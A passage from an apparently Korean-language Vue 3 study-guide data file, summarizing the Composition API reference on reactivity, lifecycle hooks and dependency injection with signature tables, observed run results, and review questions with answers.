        code: "항목                     시그니처 → 반환                                                세부 / 옵션\nref(value)                Ref<UnwrapRef<T>>                                           .value · 객체면 깊은 reactive · 중첩 ref 풀림 · shallowRef 로 회피\ncomputed(getter, dbg?)    Readonly<Ref<T>>  (getter(prev) — 3.4+ 이전 값)                  지연 · 캐시 · 쓰기 → 경고\ncomputed({ get, set }, dbg?)  Ref<T>                                                쓰기 가능\nreactive(target)          UnwrapNestedRefs<T>                                          깊은 프록시 · 프로퍼티 ref 풀림 · 배열/Map 안은 X · 프록시 ≠ 원본 · 원시값 X (경고)\nreadonly(target)          DeepReadonly<UnwrapNestedRefs<T>>                            깊은 읽기 전용 · 쓰기 경고 · shallowReadonly\nwatchEffect(fn, opts?)    WatchHandle (호출=stop · pause · resume · stop)                 즉시 1회 · 동기 중 읽은 것 추적 · fn(onCleanup) · flush 'pre'(기본)|'post'|'sync' · onTrack/onTrigger\nwatchPostEffect(fn)       = watchEffect(fn, { flush: 'post' })\nwatchSyncEffect(fn)       = watchEffect(fn, { flush: 'sync' })                            묶음 없음 · 주의\nwatch(src, cb, opts?)     WatchHandle                                                 src: ref | getter | reactive(암묵 deep) | 배열 · cb(new, old, onCleanup) · immediate · deep: boolean | number(3.5+) · flush · once(3.4+) · onTrack/onTrigger\nonWatcherCleanup(fn, failSilently?)   void  (3.5+)                                    watchEffect/watch 콜백 안 동기 호출 · await 뒤 X",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node: computed(() => { runs++; … }) 생성 직후 runs 0 → 두 번 읽음 1 → 의존 변경 후 읽기 전 1 → 읽음 2. c.value = 10 → '[Vue warn] Write operation failed: computed value is readonly'. { get, set }은 setter 동작. 안정성: 불리언 computed 의존 효과 runs 2, 새 객체 runs 3. reactive(1) → 'value cannot be made reactive: 1'. reactive 안 ref 풀림(5), 배열 안 ref 안 풀림. readonly 쓰기 → 'Set operation on key \"z\" failed: target is readonly.' watch(n) 0→2 한 번(묶음), watch(() => o.a.b) ✓, watch(o) 깊음, watch(() => o.a) 얕음, { deep: true } ✓, immediate 즉시, once 한 번, ref([]) push는 deep 없이 X. flush: ['sync', '(동기 끝)', 'pre', 'post']. Chrome: pre 콜백 DOM '0-0', post '2-1'. watchEffect(async) 첫 await 전까지. effectScope stop 뒤 무시. 자세한 맥락은 가이드 반응성 기초·계산된 속성·감시자·반응성 심화 노드.",
        code: "computed:  runs 0 → 1 (두 번 읽어도) → 1 (변경 후 읽기 전) → 2 · 쓰기 → Write operation failed: computed value is readonly\nreactive:  reactive(1) 경고 · 안의 ref 풀림 · 배열 안 X   ·   readonly 쓰기 → Set operation on key \"z\" failed: target is readonly.\nwatch:     reactive 소스 깊음 · getter 얕음 · deep ✓ · immediate · once · ref([]) push 는 deep 필요\nflush:     sync → (동기 끝) → pre (DOM 옛) → post (DOM 새)\nwatchEffect(async): 첫 await 전까지만 추적",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 만드는 것(ref · reactive · readonly), 파생(computed), 반응(watch · watchEffect) 셋이고 반응은 '무엇을 · 얼마나 · 언제' 옵션이다",
        body: "ref·reactive·readonly는 추적 가능한 값을 만들고(깊이는 shallow 계열이 조절), computed는 읽을 때 계산해 캐시하는 파생이며, watch·watchEffect는 변화에 바깥 일을 하는 효과입니다. 효과의 옵션은 세 질문입니다. 무엇을(watch는 소스 명시, watchEffect는 동기 중 읽은 것), 얼마나 깊게(deep. reactive 소스는 암묵), 언제(flush pre/post/sync). 정리는 onCleanup 인자나 3.5+ onWatcherCleanup, 수명은 WatchHandle의 stop·pause·resume입니다.",
      },
      {
        label: "다음 입구",
        body: "값의 모양을 다루는 아홉이 다음 페이지 '반응성: 유틸리티'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) watch(() => state.items, cb)가 push에 반응하지 않습니다. (2) 3.5에서 watch 콜백 안 await 뒤 onWatcherCleanup을 불렀더니 경고입니다. (3) watchSyncEffect를 배열 소스에 쓰면?",
        notes: [
          {
            title: "답",
            body: "(1) getter 소스는 반환값(배열 참조)이 바뀔 때만 반응하고 push는 같은 참조라 얕은 비교에 걸리지 않습니다(실제로 ref([]) push 미감지). { deep: true }를 주거나(3.5+면 deep: 1로 깊이 제한), 소스를 reactive 객체 자체(watch(state, …))로 넘겨 암묵적 deep을 쓰거나, 교체 방식(state.items = [...state.items, x])으로 바꿉니다. (2) onWatcherCleanup은 '감시자 콜백의 동기 실행 중'에 불러야 현재 감시자에 붙습니다. await 뒤에는 컨텍스트가 없어 경고(failSilently로 끌 수 있지만 등록은 안 됨). 콜백의 셋째 인자 onCleanup(fn)은 그 제약이 없으니 await 뒤에도 쓸 수 있고, 또는 await 전에 onWatcherCleanup을 먼저 등록합니다. (3) sync는 묶음이 없어 배열 변이 메서드 하나(splice)가 여러 번의 set을 일으키면 그때마다 콜백이 돕니다(실제로 sync는 동기 중 변경마다 두 번). 문서는 '여러 번 동기 변이되는 소스(배열)에는 피하라'고 적습니다. pre(기본)로 두면 틱 끝에 한 번입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Reactivity API: Core", href: `${DOCS}/api/reactivity-core` },
      { label: "Watchers", href: `${DOCS}/guide/essentials/watchers` },
    ],
  },

  {
    id: "va-comp-reactivity-utils",
    name: "반응성: 유틸리티",
    tagline: "isRef · unref · toRef · toValue · toRefs · isProxy · isReactive · isReadonly · isShallow",
    intro:
      "참고서 반응성 유틸리티 페이지입니다. 값의 모양을 묻고 바꾸는 아홉. isRef(r) 타입 가드. unref(r) = isRef(r) ? r.value : r. toRef: 3.3+ 정규화 꼴(ref면 그대로, getter면 읽기 전용 ref, 값이면 ref) 또는 객체 프로퍼티 꼴 toRef(obj, key, default?)(양방향 동기. 없는 키도 됨. ref(obj.x)와 다름). toValue(src)(3.3+. unref + getter 호출). toRefs(obj)(열거 가능한 프로퍼티마다 toRef. 컴포저블 반환용. 생성 시점의 키만). isProxy(reactive·readonly·shallow 계열), isReactive, isReadonly(readonly·set 없는 computed), isShallow. 실제로 돌려 보면 toRefs(st).a.value = 10 → st.a 10(양방향), toRef(st, 'c')(없는 키) → undefined, toRef(() => 1).value → 1, toValue(() => 4) → 4, unref(ref(3)) → 3, isReactive(state.nested) true, reactive 구조 분해는 끊기고 toRefs는 유지, isReactive(markRaw 안) false, isShallow(shallowReactive) true. 이 노드의 질문은 하나입니다. ref·getter·값 셋을 어떻게 오가나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                      시그니처                                   뜻 / 세부\nisRef(r)                   r is Ref<T>                               타입 가드\nunref(r)                   T                                         isRef ? .value : 값 · getter 는 안 부름\ntoRef(src)                 3.3+ · ref → 그대로 · getter → readonly ref · 값 → ref       정규화 (컴포저블 입력)\ntoRef(obj, key, default?)  ToRef<T[K]>                               객체 프로퍼티와 양방향 동기 · 없는 키도 OK · ref(obj.key) 와 다름 (그건 복사) · props 에 쓰면 쓰기 금지\ntoValue(src)               T  (3.3+)                                 unref + getter 호출 · 컴포저블 입력 정규화\ntoRefs(obj)                { [K]: ToRef }                             열거 가능 프로퍼티마다 toRef · 생성 시점 키만 · 컴포저블 반환에\nisProxy(v)                 boolean                                   reactive · readonly · shallowReactive · shallowReadonly\nisReactive(v)              boolean                                   reactive · shallowReactive\nisReadonly(v)              boolean                                   readonly · shallowReadonly · set 없는 computed\nisShallow(v)               boolean                                   shallowRef · shallowReactive · shallowReadonly",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node: const st = reactive({ a: 1, b: 2 }); const { a } = toRefs(st); a.value = 10 → st.a 10. toRef(st, 'c')(없는 키).value → undefined(에러 없음). toRef(() => 1).value → 1(getter 꼴). toValue(() => 4) → 4, unref(ref(3)) → 3. isReactive(state.nested) → true(중첩 프록시), isReactive(holder.mr)(markRaw) → false. isShallow(shallowReactive({…})) → true, isReactive(shallowReactive 안 중첩) → false. let { n } = reactive(…); n++ → 끊김(toRefs와 대비). reactive(raw) === reactive(raw) → true(isProxy 대상). 컴포저블 노드에서 toValue(url)가 ref·getter·문자열을 받는 관례, props 노드에서 3.5 구조 분해 prop을 getter로 넘겨 toValue로 받는 패턴.",
        code: "toRefs(st).a.value = 10   → st.a 10 (양방향)       toRef(st, 'c') → undefined (없는 키 OK)     toRef(() => 1).value → 1\ntoValue(() => 4) → 4 · unref(ref(3)) → 3 · isReactive(state.nested) true · isReactive(markRaw) false · isShallow(shallowReactive) true\nlet { n } = reactive(…); n++ → 끊김   vs   toRefs → 유지",
        codeLang: "text",
      },
      {
        label: "문제의 구조: ref · getter · 값 세 모양을 '길을 유지하며' 바꾸는 함수들이다",
        body: "반응성은 길(ref.value·프록시 프로퍼티)에 있으므로, 모양을 바꿀 때 길이 끊기지 않게 해 주는 것이 유틸리티입니다. toRef(obj, key)는 프로퍼티를 ref 모양으로 감싸되 원본과 양방향으로 잇고(복사가 아님), toRefs는 그것을 전부, toValue는 반대로 ref·getter를 값으로 '지금' 풀되 getter 안의 읽기는 추적되게 합니다(효과 안에서 부르면). is* 넷은 모양을 묻는 가드입니다. 컴포저블의 관례(입력 toValue, 출력 ref 묶음·toRefs)가 이 함수들 위에 있습니다.",
      },
      {
        label: "다음 입구",
        body: "추적을 일부러 끄거나 직접 만드는 열이 다음 페이지 '반응성: 고급'입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) toRef(props, 'size')로 받은 ref에 값을 쓰면? (2) 컴포저블이 reactive 객체를 돌려주는데 호출 쪽이 구조 분해하고 싶습니다. (3) 컴포저블 인자가 ref인지 getter인지 값인지 모른 채 안에서 읽으려면?",
        notes: [
          {
            title: "답",
            body: "(1) toRef(obj, key)는 양방향이라 쓰기가 props.size = v와 같고, props는 읽기 전용이라 경고('Set operation on key … failed: target is readonly.')입니다. 문서는 '허용되지 않음. computed { get, set }으로 로컬 상태를 만들라'고 적습니다. 읽기만 하려면 toRef(() => props.size)(3.3+ getter 꼴, 읽기 전용 ref)가 뜻이 분명합니다. (2) const { x, y } = toRefs(useThing())로 받으면 각 프로퍼티가 양방향 ref가 되어 구조 분해해도 연결이 삽니다(실제로 toRefs 양방향). 단 toRefs는 호출 시점의 열거 가능 키만 만드니 나중에 추가되는 키는 toRef(obj, key)로 따로. 컴포저블 쪽을 고칠 수 있으면 처음부터 ref 묶음을 돌려줍니다. (3) toValue(src)입니다(3.3+). ref면 .value, 함수면 호출 결과, 값이면 그대로. watchEffect나 computed 안에서 부르면 ref·getter 안의 의존이 추적됩니다(실제로 toValue(() => 4) → 4). unref는 getter를 부르지 않으니 getter 입력을 받으려면 toValue입니다. 타입은 MaybeRefOrGetter<T>.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Reactivity API: Utilities", href: `${DOCS}/api/reactivity-utilities` },
      { label: "Composables — Input Arguments", href: `${DOCS}/guide/reusability/composables#input-arguments` },
    ],
  },

  {
    id: "va-comp-reactivity-advanced",
    name: "반응성: 고급",
    tagline: "shallowRef · triggerRef · customRef · shallowReactive · shallowReadonly · toRaw · markRaw · effectScope · getCurrentScope · onScopeDispose",
    intro:
      "참고서 반응성 고급 페이지입니다. 추적을 얕게 하거나 끄거나 직접 만드는 열. shallowRef(v)(.value 교체만 추적, 안은 그대로). triggerRef(r)(얕은 ref의 깊은 변경 뒤 강제 통지). customRef((track, trigger) => ({ get, set }))(추적·통지 시점을 직접. 디바운스 예. '매번 새 객체를 돌려주는 getter는 주의'). shallowReactive(obj)(루트 프로퍼티만, ref 풀림 없음. '루트 상태에만, 중첩 금지'). shallowReadonly(루트만 읽기 전용). toRaw(proxy)(원본. '영구 참조 보관 비권장'). markRaw(obj)(프록시 변환 금지 표시. '루트만. 중첩 미표시 객체는 다시 접근하면 프록시 → 정체 위험'). effectScope(detached?)(run·stop. 효과 묶음). getCurrentScope(). onScopeDispose(fn, failSilently?)(3.5+ 둘째 인자). 실제로 돌려 보면 shallowRef 깊은 변경 runs 그대로 → triggerRef runs +1 → .value 교체 +1, toRaw(rx) === raw, reactive(raw) === rx, isReactive(markRaw 안) false, shallowReactive 안 중첩 isReactive false, readonly 쓰기 경고, effectScope stop 뒤 무시 + onScopeDispose 호출, customRef 디바운스 'ab' 한 번. 이 노드의 질문은 하나입니다. 추적을 어디까지, 언제 끄나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                       시그니처                                    세부\nshallowRef(value)           ShallowRef<T>                              .value 접근만 반응 · .value.x 변경은 X · 교체는 ✓ · 거대·외부 상태용\ntriggerRef(ref)             void                                       얕은 ref 의 깊은 변경 뒤 강제 통지\ncustomRef(factory)          Ref<T>  (factory(track, trigger) → { get, set })   추적·통지 직접 · 디바운스 등 · 주의: getter 가 매번 새 객체면 자식 재갱신\nshallowReactive(target)     T                                          루트 프로퍼티만 · ref 풀림 X · 중첩 변환 X · 주의: 루트 상태에만\nshallowReadonly(target)     Readonly<T>                                루트만 읽기 전용 · 중첩은 쓰기 가능\ntoRaw(proxy)                T                                          원본 객체 · 추적 없는 읽기·쓰기 · 영구 보관 비권장\nmarkRaw(value)              T                                          프록시 변환 금지 · 루트만 (중첩 미표시는 다시 접근 시 프록시 → foo.nested !== bar.nested 위험)\neffectScope(detached?)      EffectScope { run(fn) → T | undefined, stop() }   효과 묶음 · 비활성이면 run undefined · detached: 부모에서 분리\ngetCurrentScope()           EffectScope | undefined\nonScopeDispose(fn, failSilently?)   void                               scope.stop 때 · 컴포저블의 onUnmounted 대체 · scope 없으면 경고 (3.5+ true 로 억제)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Node: const s = shallowRef({ n: 0 }); watchEffect(() => s.value.n) → s.value.n = 1 뒤 runs 1(변화 없음) → triggerRef(s) → runs 2 → s.value = { n: 2 } → runs 3. toRaw(rx) === raw true, reactive(raw) === rx true(캐시), reactive(rx) === rx true. const holder = reactive({ mr: markRaw({}) }); isReactive(holder.mr) → false. shallowReactive({ deep: {} })의 isReactive(sr.deep) → false, isShallow(sr) → true. readonly(reactive({ z: 1 })).z = 2 → 'Set operation on key \"z\" failed: target is readonly.' 값 1 유지. effectScope().run(() => { watchEffect(…); onScopeDispose(() => disposed = true) }) → stop 뒤 변경 무시, disposed true. customRef 디바운스 20ms: 'a', 'ab' 연속 → watch 'ab' 한 번. 서버 렌더에서 외부 라이브러리 인스턴스를 reactive에 넣는 측정은 하지 않았지만 성능 노드의 '거대 불변 구조는 shallowRef + 루트 교체' 처방이 이 페이지의 shallowRef입니다.",
        code: "shallowRef:  s.value.n = 1 → runs 1 (X) · triggerRef(s) → 2 · s.value = {…} → 3\ntoRaw(rx) === raw ✓ · reactive(raw) === rx ✓ · reactive(rx) === rx ✓ · isReactive(markRaw 안) false\nshallowReactive: isReactive(sr.deep) false · isShallow true\nreadonly 쓰기 → Set operation on key \"z\" failed: target is readonly.\neffectScope: stop 뒤 무시 · onScopeDispose ✓   ·   customRef 디바운스: 'a','ab' → 'ab' 한 번",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 깊은 추적이 기본이고, 이 열은 그 깊이를 '루트까지(shallow)' · '없음(raw)' · '수동(custom · trigger)' 으로 조절하며 효과의 수명(scope) 을 묶는다",
        body: "ref·reactive는 깊게 변환합니다. 비용이 크거나(거대 데이터) 변환이 해로우면(외부 인스턴스, 불변 라이브러리) shallow 계열로 루트만 추적하고 교체로 갱신하거나(triggerRef로 수동 통지), markRaw·toRaw로 변환을 끕니다. markRaw는 루트만 표시라 중첩 객체의 정체가 어긋날 수 있고 toRaw 참조는 추적을 우회하니 보관하지 않습니다. customRef는 track·trigger를 손에 쥐어 '언제 반응하나'를 바꿉니다. effectScope는 컴포넌트 밖에서 효과들의 수명을 하나로 묶어 stop하고, onScopeDispose가 그 끝에 걸립니다(컴포저블이 컴포넌트·스토어 어디서든 정리되게).",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '라이프사이클 훅'은 열셋의 시점과 SSR 호출 여부입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 지도 라이브러리 인스턴스를 state에 넣었더니 지도가 깨집니다. (2) 10만 개 로그 배열을 반응형으로. (3) Pinia 없이 모듈 수준 컴포저블의 watch를 테스트 뒤 정리하려면?",
        notes: [
          {
            title: "답",
            body: "(1) reactive가 인스턴스를 깊은 프록시로 감싸 내부 슬롯·private 접근이 깨집니다(JS 노드 Proxy 측정과 같은 원인). markRaw(map)으로 변환을 막아 넣거나 shallowRef(map)에 담아 참조만 반응형으로 둡니다. 인스턴스 자체를 바꿀 일이 없으면 보통 변수로. (2) shallowRef([])로 두고 logs.value = [...logs.value, ...batch]로 루트 교체만 추적시킵니다(실제로 shallowRef는 교체에만 반응). 요소 10만 개를 깊은 프록시로 만들지 않아 비용이 없습니다. push로 바꿨다면 triggerRef(logs)로 수동 통지. 화면은 가상화. (3) const scope = effectScope(); scope.run(() => useThing()); … scope.stop(). 컴포저블 안의 watch·computed가 scope에 묶이고 stop에 전부 멈추며, 안에서 onScopeDispose로 등록한 정리가 돕니다(실제로 stop 뒤 변경 무시·disposed true). 컴포저블이 onUnmounted를 쓰면 scope에서는 경고가 나니 onScopeDispose로 바꿉니다(3.5+ failSilently).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Reactivity API: Advanced", href: `${DOCS}/api/reactivity-advanced` },
      { label: "Performance — Reduce Reactivity Overhead", href: `${DOCS}/guide/best-practices/performance#reduce-reactivity-overhead-for-large-immutable-structures` },
    ],
  },

  {
    id: "va-comp-lifecycle",
    name: "라이프사이클 훅 API",
    tagline: "onBeforeMount … onUnmounted, onErrorCaptured, onRenderTracked/Triggered, onActivated/Deactivated, onServerPrefetch — 전부 setup 중 동기로",
    intro:
      "참고서 Composition API 라이프사이클 페이지입니다. '이 페이지의 모든 API는 setup 중 동기로 불러야 한다'. 열셋. onMounted(DOM 삽입 뒤, 동기 자식 마운트 뒤. SSR X), onUpdated(DOM 갱신 뒤, 부모는 자식 뒤. '여기서 상태를 바꾸면 무한 루프'. SSR X), onUnmounted(자식 언마운트·효과 정지 뒤. SSR X), onBeforeMount, onBeforeUpdate, onBeforeUnmount(SSR X), onErrorCaptured((err, instance, info) → boolean | void. 출처 7종, 아래→위 전파, false면 중단, 훅 자체가 던지면 둘 다 errorHandler로. 에러 UI는 원래 내용을 다시 그리지 말 것), onRenderTracked/onRenderTriggered(개발만. SSR X), onActivated/onDeactivated(KeepAlive. SSR X), onServerPrefetch(서버만. Promise 기다림). 실제로 돌려 보면 부모 setup → 부모 beforeMount → 자식 setup·beforeMount·mounted → 부모 mounted, 갱신은 부모 beforeUpdate → 자식 beforeUpdate → 자식 updated → 부모 updated, 서버는 serverPrefetch만, KeepAlive는 activated/deactivated 반복, onErrorCaptured false로 errorHandler 차단, 디렉티브 훅도 같은 순서. 이 노드의 질문은 하나입니다. 열셋이 각각 언제 불리고 어디서는 안 불리나.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "훅                        시점                                                             SSR    세부\nonBeforeMount(cb)          반응형 상태 준비 뒤 · DOM 생성 전                                       X      ref null\nonMounted(cb)              DOM 삽입 뒤 · 동기 자식 마운트 뒤 (비동기·Suspense 자식 제외)               X      측정 · 서드파티 초기화\nonBeforeUpdate(cb)         반응형 변경으로 DOM 갱신 직전                                           X      상태 변경 안전\nonUpdated(cb)              DOM 갱신 뒤 · 부모는 자식 뒤 · 모든 갱신에                                 X      상태 변경 → 무한 루프 경고 · 특정 변경은 nextTick\nonBeforeUnmount(cb)        언마운트 직전 · 인스턴스 온전                                            X\nonUnmounted(cb)            자식 언마운트 · 효과 정지 뒤                                             X      타이머·리스너·연결 정리\nonErrorCaptured(cb)        자손 에러 (렌더 · 핸들러 · 훅 · setup · watcher · 디렉티브 · Transition)        -      (err, instance, info) · 아래→위 · false 면 중단 · 훅이 던지면 둘 다 errorHandler · 운영 info 코드\nonRenderTracked(cb)        렌더가 의존을 추적할 때 (개발만)                                        X      { effect, target, type: get|has|iterate, key }\nonRenderTriggered(cb)      의존이 리렌더를 일으킬 때 (개발만)                                       X      type: set|add|delete|clear · newValue · oldValue\nonActivated(cb)            KeepAlive 캐시에서 DOM 삽입 뒤 (첫 마운트 포함)                            X\nonDeactivated(cb)          KeepAlive 로 DOM 에서 제거 뒤 (언마운트 포함)                              X\nonServerPrefetch(cb)       서버 렌더 전 · Promise 기다림                                           O만    클라이언트 X\n\n규칙: 전부 setup 중 동기 호출 (setTimeout · await 뒤 X)",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: 마운트 parent setup → parent beforeMount → child setup → child beforeMount → child mounted → parent mounted. 갱신 parent beforeUpdate → child beforeUpdate → child updated → parent updated. 언마운트 parent beforeUnmount → child beforeUnmount → child unmounted → parent unmounted. 부모 mounted에서 자식 DOM 셋 전부 있음. KeepAlive: mounted → activated → deactivated → activated … → (LRU 퇴출) deactivated → unmounted. onErrorCaptured가 핸들러·watcher·렌더 에러를 잡고 false → errorHandler 미호출. 템플릿 ref는 setup·beforeMount null, mounted 요소. Node: 서버에서 돈 훅은 serverPrefetch만(10ms 대기를 기다림), beforeMount·mounted X. 디렉티브 훅 created → beforeMount → mounted → beforeUpdate → updated → beforeUnmount → unmounted. 자세한 맥락은 가이드 라이프사이클·KeepAlive·애플리케이션 생성 노드.",
        code: "마운트:   parent setup → parent beforeMount → child setup → child beforeMount → child mounted → parent mounted\n갱신:     parent beforeUpdate → child beforeUpdate → child updated → parent updated\n언마운트:  parent beforeUnmount → child beforeUnmount → child unmounted → parent unmounted\nKeepAlive: mounted → activated ⇄ deactivated → (퇴출) deactivated → unmounted\n서버:     ['child serverPrefetch'] 만\nonErrorCaptured(() => false) → errorHandler 미호출",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 훅은 '인스턴스의 시간' 위의 지점이고, 지점마다 있는 것(DOM · 자식 · 서버)이 다르다",
        body: "before*는 위에서 아래로, 완료 훅은 아래에서 위로. DOM은 mounted부터 beforeUnmount까지. 서버에는 마운트 자체가 없어 setup과 serverPrefetch만. KeepAlive는 마운트 대신 활성화를 반복. onErrorCaptured는 트리를 따라 위로 흐르는 에러의 중간 지점이고 false가 흐름을 끊습니다. 등록은 setup 중 동기여야 어느 인스턴스의 지점인지 알 수 있습니다. 가이드 라이프사이클 노드의 '문제의 구조'와 같습니다.",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '의존성 주입'은 provide·inject·hasInjectionContext입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) onUpdated에서 리스트 길이를 state에 넣었더니 무한 루프입니다. (2) 에러 UI를 보이는 경계 컴포넌트가 에러를 계속 다시 던집니다. (3) 서버에서 데이터를 받아 HTML에 넣고 싶은데 onMounted가 안 돕니다.",
        notes: [
          {
            title: "답",
            body: "(1) 문서의 경고 그대로입니다. updated에서 상태를 바꾸면 갱신이 갱신을 부릅니다. 리스트 길이는 computed(() => list.value.length)로 렌더 중 파생합니다. DOM 측정이 필요한 값이면 조건(값이 달라졌을 때만 set)을 두거나 watch(list, …, { flush: 'post' })로 특정 변경에만 반응합니다. (2) onErrorCaptured((e) => { error.value = e; return false })에서 에러 UI가 '원래 내용(에러를 낸 자식)'을 다시 그리면 다시 던져 무한 렌더가 됩니다(문서 주의). 에러 상태에서는 자식을 v-if로 빼고 대체 UI만 그립니다. false를 돌려줬으니 errorHandler에는 가지 않으므로(실제로 확인) 모니터링은 그 자리에서. (3) 서버에는 mounted가 없습니다(실제로 serverPrefetch만). onServerPrefetch(async () => { data.value = await fetchData() })로 서버 렌더러가 기다리게 하고, 받은 데이터를 직렬화해 클라이언트가 같은 상태로 하이드레이션하게 합니다. 클라이언트에서는 onServerPrefetch가 불리지 않으니 CSR 전환 시에는 onMounted에서 받는 분기를 둡니다(Nuxt의 useAsyncData가 이 둘을 묶음).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composition API: Lifecycle Hooks", href: `${DOCS}/api/composition-api-lifecycle` },
      { label: "Lifecycle Hooks (Guide)", href: `${DOCS}/guide/essentials/lifecycle` },
    ],
  },

  {
    id: "va-comp-di",
    name: "의존성 주입",
    tagline: "provide(key, value) · inject(key, default?, treatAsFactory?) · hasInjectionContext()",
    intro:
      "참고서 의존성 주입 페이지입니다. 셋. provide(key, value): key는 string | InjectionKey<T>(Symbol). setup 중 동기. inject(key) → T | undefined: 조상 체인에서 가장 가까운 제공자, 없으면 undefined(+경고). inject(key, default) → T. inject(key, factory, true) → T(셋째 true면 함수를 팩토리로 호출. 없으면 함수 자체가 값). setup 중 동기. hasInjectionContext() → boolean(3.3+. inject를 경고 없이 쓸 수 있는 컨텍스트인가. 라이브러리용). 실제로 돌려 보면 ref를 provide한 자식이 갱신됐고(1), readonly(count)를 inject한 자식의 쓰기는 'Set operation on key \"value\" failed: target is readonly.', Teleport로 이동한 자식도 inject 됐고, 서버에서 inject('msg', '기본값')이 '주입됨'을 받았습니다. 이 노드의 질문은 하나입니다. 세 함수의 인자와 반환은 무엇인가.",
    blocks: [
      {
        label: "항목",
        body: "항목마다 핵심 한 줄과 실제로 돌려 본 것을 붙였습니다.",
        code: "항목                                  시그니처                            세부\nprovide(key, value)                    void                               key: string | InjectionKey<T> (Symbol) · value: 무엇이든 (ref 포함 · 풀리지 않음) · setup 중 동기\ninject(key)                            T | undefined                      가장 가까운 조상 제공자 · 없으면 undefined + 경고\ninject(key, defaultValue)              T                                  기본값 (함수를 넘기면 함수 자체가 값)\ninject(key, factory, true)             T                                  셋째 true: factory() 결과 (비싼 값)\nhasInjectionContext()                  boolean  (3.3+)                     inject 가능 컨텍스트인가 · 라이브러리가 경고 피하려고\n\n반응성: ref 를 넘기면 자손에서 반응형 · 변경은 제공자 (readonly + 변경 함수) · 키는 Symbol 로 충돌 방지",
        codeLang: "text",
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome: provide('count', ref) → count.value = 1 뒤 자식 '1'. provide('ro', readonly(count)) → 자식 ro.value++ → '[Vue warn] Set operation on key \"value\" failed: target is readonly.' Teleport 안 Inner가 inject('msg') → '부모가 provide'(논리 트리). Node: provide('msg', '주입됨') → 자식 inject('msg', '기본값') → '주입됨'(서버 ✓). 보통 객체를 provide하고 자손이 바꾸면 추적이 없어 다른 갱신에 묻어서만 그려졌습니다. 플러그인 노드의 app.provide가 같은 통로의 앱 수준입니다. 라이프사이클 측정과 같이 setup 밖(setTimeout)에서는 컨텍스트가 없습니다.",
        code: "provide('count', ref) → 자식 갱신 ✓   ·   readonly inject 쓰기 → Set operation on key \"value\" failed: target is readonly.\nTeleport 안 inject ✓ (논리 트리)   ·   SSR inject ✓ ('주입됨')   ·   보통 객체 변경 → 추적 없음",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 통로는 조상 체인이고, 반응성과 소유권은 넘기는 값이 정한다",
        body: "inject는 setup 중 조상 체인을 올라가 가장 가까운 provide를 찾습니다. 기준은 논리 트리(Teleport·슬롯 안도 됨). 못 찾으면 기본값·팩토리. 넘기는 값이 ref·reactive면 반응형으로 이어지고, 보통 값이면 스냅샷입니다. 소유권은 통로가 보장하지 않으니 readonly와 변경 함수로 '제공자가 바꾼다'를 적습니다. 키 충돌은 Symbol(InjectionKey)로 피합니다. 가이드 Provide/inject 노드의 구조와 같습니다.",
      },
      {
        label: "다음 입구",
        body: "Composition API의 마지막 페이지 '헬퍼'는 useAttrs·useSlots·useModel·useTemplateRef·useId입니다.",
      },
      {
        label: "확인 질문",
        body: "(1) inject('config', () => loadConfig())를 했는데 config가 함수입니다. (2) 라이브러리 컴포저블이 inject를 쓰는데 컴포넌트 밖에서 불리면 경고를 피하고 기본 동작을 하고 싶습니다. (3) 자손이 provide된 settings를 바꾸면 안 되게.",
        notes: [
          {
            title: "답",
            body: "(1) 둘째 인자 함수는 기본으로 '값 자체'입니다(함수를 provide할 수도 있어서). 팩토리로 부르게 하려면 셋째 인자 true. inject('config', () => loadConfig(), true). (2) 3.3+ hasInjectionContext()로 먼저 검사합니다. if (hasInjectionContext()) { const x = inject(Key) } else { /* 기본 */ }. 컨텍스트가 없으면 inject가 경고와 undefined를 내므로 그 전에 가릅니다. 앱 수준에서 쓰게 하려면 app.runWithContext(fn) 안에서 부르게 안내합니다. (3) provide(SettingsKey, readonly(settings))로 읽기 전용 프록시를 넘기고, 바꿀 권한은 provide(SettingsKey, { settings: readonly(settings), update })처럼 함수로 함께 줍니다. 자손이 직접 쓰면 'Set operation on key … failed: target is readonly.' 경고로 막힙니다(실제로 확인). TS면 InjectionKey<{ settings: DeepReadonly<Settings>; update: … }>로 타입에도 적습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Composition API: Dependency Injection", href: `${DOCS}/api/composition-api-dependency-injection` },
      { label: "Provide / Inject (Guide)", href: `${DOCS}/guide/components/provide-inject` },
    ],
  },

  {
    id: "va-comp-helpers",
    name: "헬퍼",
    tagline: "useAttrs · useSlots · useModel(3.4+) · useTemplateRef(3.5+) · useId(3.5+)",
    intro:
